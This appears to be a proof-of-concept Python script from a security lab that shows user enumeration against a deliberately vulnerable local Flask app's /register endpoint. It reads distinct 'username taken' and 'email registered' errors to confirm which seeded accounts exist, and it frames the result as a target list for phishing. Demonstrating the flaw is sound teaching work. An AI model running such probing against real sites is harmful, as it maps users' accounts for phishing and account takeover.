"""
Attack #1 — USER ENUMERATION AT ENROLLMENT  (CWE-204 / OWASP ASVS 2.5)
Target: POST /register on the vulnerable Flask app (http://127.0.0.1:5000)

Premise
-------
The /register endpoint returns DISTINCT error messages depending on WHY a
signup was rejected:
    - "username already taken"      -> that username exists
    - "email already registered"    -> that email exists
    - 201 registered                -> neither existed (account was created)

That difference is an oracle. An attacker who has a list of candidate
usernames/emails can classify each one as "exists" or "free" without any
credentials, simply by attempting to register it. This is the enrollment
half of a full user-base map (pairs with attack #3, recovery enumeration).

What this script proves
-----------------------
Given a wordlist of guesses, it tells us exactly which usernames and which
emails are already registered on the target — the attacker "gains" a
confirmed roster of valid accounts to feed into phishing / recovery abuse.

Runs unmodified against a fresh instance. The seeded accounts are
'victim'/'victim@corp.example' and 'root'/'root@corp.example'.
"""

import requests

BASE = "http://127.0.0.1:5000"

# Candidate identities an attacker might try. Mix of real (seeded) and fake.
USERNAME_GUESSES = ["victim", "root", "administrator", "jsmith", "guest"]
EMAIL_GUESSES = [
    "victim@corp.example",     # seeded -> exists
    "root@corp.example",       # seeded -> exists
    "ceo@corp.example",        # fake   -> free
    "helpdesk@corp.example",   # fake   -> free
]


def probe_username(name):
    """Attempt a registration; read the error to classify the username.

    We send a unique throwaway email each time so that a 'username taken'
    rejection is unambiguous (it can't be the email colliding).
    """
    r = requests.post(
        f"{BASE}/register",
        json={"username": name, "email": f"probe_{name}_zzz@nope.invalid", "password": "x"},
    )
    if r.status_code == 409 and "username" in r.text:
        return "EXISTS"
    if r.status_code == 201:
        return "free (now created)"
    return f"other ({r.status_code}: {r.text.strip()})"


def probe_email(addr):
    """Attempt a registration; read the error to classify the email.

    Unique throwaway username so a 'email already registered' rejection is
    unambiguously about the email.
    """
    r = requests.post(
        f"{BASE}/register",
        json={"username": f"probe_zzz_{addr}", "email": addr, "password": "x"},
    )
    if r.status_code == 409 and "email" in r.text:
        return "EXISTS"
    if r.status_code == 201:
        return "free (now created)"
    return f"other ({r.status_code}: {r.text.strip()})"


def main():
    print("=" * 68)
    print("ATTACK #1 - Enrollment user enumeration via distinct errors")
    print("Target:", BASE)
    print("=" * 68)

    print("\n[*] Probing usernames:")
    found_users = []
    for name in USERNAME_GUESSES:
        verdict = probe_username(name)
        print(f"    {name:<16} -> {verdict}")
        if verdict == "EXISTS":
            found_users.append(name)

    print("\n[*] Probing emails:")
    found_emails = []
    for addr in EMAIL_GUESSES:
        verdict = probe_email(addr)
        print(f"    {addr:<28} -> {verdict}")
        if verdict == "EXISTS":
            found_emails.append(addr)

    print("\n" + "-" * 68)
    print("[+] ATTACKER GAIN - confirmed valid accounts (no auth needed):")
    print(f"    usernames that exist: {found_users}")
    print(f"    emails that exist:    {found_emails}")
    print("[+] These are now targets for phishing and recovery abuse (attack #3).")
    print("-" * 68)


if __name__ == "__main__":
    main()
